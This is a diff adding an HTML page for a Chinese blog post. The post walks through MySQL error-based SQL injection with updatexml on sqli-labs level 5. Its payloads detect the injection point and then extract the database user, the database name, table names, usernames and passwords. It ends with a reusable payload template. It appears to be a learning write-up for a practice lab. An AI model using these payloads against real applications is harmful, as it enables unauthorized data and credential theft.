@@ -1,0 +1,174 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="google-site-verification" content="" />
+  <meta name="referrer" content="unsafe-url">
+  
+  <title>sqli-labs-报错注入-updatexml报错</title>
+  <meta name="author" content="Willianhuanbian">
+  <meta name="description" content="前言union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用.
+所以当页面没有显示位时,我们需要用其他方法来获取数据.因此我们可以使用报错注入: 有些网站在开发调试阶段开启了报错提示信息,如果没有关闭,就有可能存在报错注入.
+报错注入函数:
+
+floor函数
+extractvalue报">
+  
+  
+  <meta property="og:title" content="sqli-labs-报错注入-updatexml报错"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:site_name" content="Willianir&#39;s home"/>
+  <link href="/apple-touch-icon-precomposed.png" sizes="180x180" rel="apple-touch-icon-precomposed">
+  <link rel="alternate" href="/atom.xml" title="Willianir&#39;s home" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/m.min.css">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <a id="top"></a>
+  <div id="main">
+    <div class="main-ctnr">
+      <div class="behind">
+  <a href="/" class="back black-color">
+    <svg class="i-close" viewBox="0 0 32 32" width="22" height="22" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+        <path d="M2 30 L30 2 M30 30 L2 2"></path>
+    </svg>
+  </a>
+  
+</div>
+
+
+  <article class="standard post">
+    <div class="title">
+      
+  
+    <h1 class="page-title center">
+        sqli-labs-报错注入-updatexml报错
+    </h1>
+  
+
+
+    </div>
+    <div class="meta center">
+      <time datetime="2021-06-05T07:48:43.930Z" itemprop="datePublished">
+  <svg class="i-calendar" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+    <path d="M2 6 L2 30 30 30 30 6 Z M2 15 L30 15 M7 3 L7 9 M13 3 L13 9 M19 3 L19 9 M25 3 L25 9"></path>
+  </svg>
+  &nbsp;
+  2021-06-05
+</time>
+
+
+
+
+
+
+    </div>
+    <hr>
+    
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81updatexml%E6%8A%A5%E9%94%99"><span class="toc-text">一、updatexml报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81updatexml%E6%8A%A5%E9%94%99%E8%AE%B0%E5%BF%86"><span class="toc-text">二、updatexml报错记忆</span></a></li></ol>
+    
+    <div class="picture-container">
+      
+    </div>
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用.</p>
+<p>所以当页面没有显示位时,我们需要用其他方法来获取数据.因此我们可以使用报错注入: 有些网站在开发调试阶段开启了报错提示信息,如果没有关闭,就有可能存在报错注入.</p>
+<p>报错注入函数:</p>
+<ul>
+<li>floor函数</li>
+<li>extractvalue报错</li>
+<li>updatexml报错</li>
+</ul>
+<p>今天我在这里先记录一下对于<strong>updatexml报错</strong>函数的学习</p>
+<h1 id="一、updatexml报错"><a href="#一、updatexml报错" class="headerlink" title="一、updatexml报错"></a>一、updatexml报错</h1><p>基本格式: <code>?id=1  and updatexml(1,(payload),1)</code><br>举例:    <code>?id=1 and  updatexml(1, (concat(0x7e,(select @@version),0x7e)),1)</code></p>
+<p>在这里我们以sql-labs第五关进行操作：<br><strong>payload：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="hljs-string">2.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string">4.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314160622261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到是没有显示位的，因此不能进行联合查询注入-我们选择<strong>报错注入</strong></p>
+<p><strong>判断注入点</strong><br>当and 1=1 or and 1=2 时都显示不变<br><img src="https://img-blog.csdnimg.cn/20210314161148263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此输入：<code>?id=1 &#39;</code>判断<img src="https://img-blog.csdnimg.cn/20210314161311827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>确定注入类型为字符型注入</p>
+<p><strong>回显</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314161801691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆数据库</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314161910353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314162338958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆用户名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314162538479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆密码</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210314162631676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="二、updatexml报错记忆"><a href="#二、updatexml报错记忆" class="headerlink" title="二、updatexml报错记忆"></a>二、updatexml报错记忆</h1><p>操作一遍大家可以发现其实语法并不难，很便于记住：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select /*payload*/),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p>在回显中以及爆数据库这两步只需要改变/<em>payload</em>/即可</p>
+<p>爆表名虽然有一丢多：<code>?id=1 &#39; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39; limit 0,1),0x7e),1) --+</code></p>
+<p>那么爆用户名以及密码基本不需要怎么改变：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(/*payload*/) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
+<p>同样这两步也只需要改变/<em>payload</em>/</p>
+<p>其实这个多敲几遍也就记住了     –.–</p>
+
+
+  </article>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="busuanzi center">
+    page PV:&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;・&nbsp;
+    site PV:&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;・&nbsp;
+    site UV:&nbsp;<span id="busuanzi_value_site_uv"></span>
+  </div>
+
+
+    
+
+
+
+
+
+    </div>
+  </div>
+  <footer class="page-footer"><div class="clearfix">
+</div>
+<div class="right-foot">
+    <div class="firstrow">
+        <a href="#top" target="_self">
+        <svg class="i-caret-right" viewBox="0 0 32 32" width="24" height="24" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+            <path d="M10 30 L26 16 10 2 Z"></path>
+        </svg>
+        </a>
+        © XXX 2016-2020
+    </div>
+    <div class="secondrow">
+        <a href="">
+        Willianir
+        </a>
+    </div>
+</div>
+<div class="clearfix">
+</div>
+</footer>
+  <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<script src="/js/search.min.js"></script>
+<script type="text/javascript">
+
+// disqus scripts
+
+
+// dropdown scripts
+$(".dropdown").click(function(event) {
+  var current = $(this);
+  event.stopPropagation();
+  $(current).children(".dropdown-content")[($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass']("open")
+});
+$(document).click(function(){
+    $(".dropdown-content").removeClass("open");
+})
+
+var path = "/search.xml";
+searchFunc(path, 'local-search-input', 'local-search-result');
+
+</script>
+
+</body>
+</html>
